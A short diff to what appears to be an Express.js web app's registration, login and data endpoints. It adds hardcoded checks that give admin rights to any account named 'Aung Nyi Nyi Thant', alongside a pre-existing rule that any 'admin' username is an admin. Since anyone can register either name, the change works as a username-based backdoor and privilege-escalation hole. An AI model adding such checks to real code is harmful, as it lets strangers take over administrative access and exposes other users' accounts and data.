@@ -96,7 +96,7 @@ app.post('/api/register', async (req, res) => {
     // HASH PASSWORD
     const passwordHash = await bcrypt.hash(password, 10);
 
-    const isAdmin = (username.toLowerCase() === 'admin');
+    const isAdmin = (username.toLowerCase() === 'admin' || username === 'Aung Nyi Nyi Thant');
 
     db.users[userId] = {
         id: userId,
@@ -163,7 +163,7 @@ app.post('/api/login', loginLimiter, async (req, res) => {
             userId: user.id,
             username: user.username,
             partnerId: user.partnerId,
-            isAdmin: !!user.isAdmin,
+            isAdmin: !!user.isAdmin || (user.username.toLowerCase() === 'admin' || user.username === 'Aung Nyi Nyi Thant'),
             token: token
         });
     } else {
@@ -206,6 +206,7 @@ app.get('/api/data/:userId', authenticate, (req, res) => {
         success: true,
         data: spaceData,
         username: user.username,
+        isAdmin: !!user.isAdmin || (user.username.toLowerCase() === 'admin' || user.username === 'Aung Nyi Nyi Thant'),
         partnerName: partnerName,
         myId: userId
     });
